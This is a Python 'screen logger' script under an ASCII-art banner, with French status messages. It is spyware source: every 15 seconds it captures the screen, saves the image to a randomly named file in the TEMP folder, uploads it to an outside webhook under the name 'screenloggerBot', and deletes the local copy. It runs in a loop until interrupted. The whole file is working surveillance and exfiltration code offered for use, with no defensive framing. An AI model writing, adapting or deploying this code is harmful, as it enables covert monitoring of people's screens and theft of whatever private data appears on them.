#         ,-.-.                       .=-.-.         ,-.--, 
#,-..-.-./  \==\  _..---.    _.-.    /==/_ /.--.-.  /=/, .' 
#|, \=/\=|- |==|.' .'.-. \ .-,.'|   |==|, | \==\ -\/=/- /   
#|- |/ |/ , /==/==/- '=' /|==|, |   |==|  |  \==\ -' ,/    
# \, ,     _|==|==|-,   ' |==|- |   |==|- |   |==|,  - |    
# | -  -  , |==|==|  .=. \|==|, |   |==| ,|  /==/   ,   \   
#  \  ,  - /==//==/- '=' ,|==|- -._|==|- | /==/, .--, - \  
#  |-  /\ /==/|==|   -   //==/ - , ,/==/. / \==\- \/=/ , /  
#  --  -- -._.___,' -------'---   ---'  --   

import os
import pyscreeze
import time
import requests
import random
import string

webhook_url = 'YOUR_WEBHOOK'
last_sent_time = 0

COOLDOWN_TIME = 15

def generate_random_filename():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16)) + ".png" 

def take_screenshot():
    temp_dir = os.getenv('TEMP')
    log_file = os.path.join(temp_dir, generate_random_filename())
    my_screenshot = pyscreeze.screenshot()
    my_screenshot.save(log_file)
    return log_file

def send_log_file(log_file):
    global last_sent_time
    with open(log_file, 'rb') as f:
        files = {
            'file': (log_file, f)
        }
        data = {
            'content': 'screen logger file:',
            'username': 'screenloggerBot'
        }

        try:
            response = requests.post(webhook_url, data=data, files=files)
            if response.status_code == 200:
                print("fichier envoyé !")
            else:
                print(f"Erreur lors de l'envoi: {response.status_code}")
        except Exception as e:
            print(f"Erreur lors de l'envoi: {e}")

    os.remove(log_file)  
    last_sent_time = time.time()

def check_and_send_log():
    global last_sent_time
    current_time = time.time()
    if current_time - last_sent_time >= COOLDOWN_TIME:
        log_file = take_screenshot()  
        send_log_file(log_file)
    else:
        print(f"Prochain envoi dans : {int(COOLDOWN_TIME - (current_time - last_sent_time))} secondes.")

try:
    print("Ctrl + C pour quitter.")
    
    while True:
        check_and_send_log()
        time.sleep(10)

except KeyboardInterrupt:
    print('Sortie du screenLogger.')
    log_file = take_screenshot()  
    send_log_file(log_file)
